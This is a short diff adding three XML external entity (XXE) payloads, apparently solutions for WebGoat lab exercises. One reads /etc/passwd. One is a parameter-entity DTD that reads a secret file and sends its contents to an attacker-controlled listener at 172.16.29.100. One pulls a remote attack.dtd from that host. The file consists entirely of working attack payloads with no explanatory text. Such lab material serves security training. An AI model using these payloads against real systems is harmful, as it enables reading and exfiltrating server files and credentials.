@@ -1,0 +1,24 @@
+1.
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+
+2.
+<!ENTITY % file SYSTEM "file:///root/.webgoat-8.2.2/XXE/secret.txt">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://172.16.29.100:9091/landing?text=%file;'>">
+%all;
+%send;
+
+3.
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://172.16.29.100:9091/files/admin1/attack.dtd">
+  %remote;
+]>
+<comment>
+  <text>test</text>
+</comment>
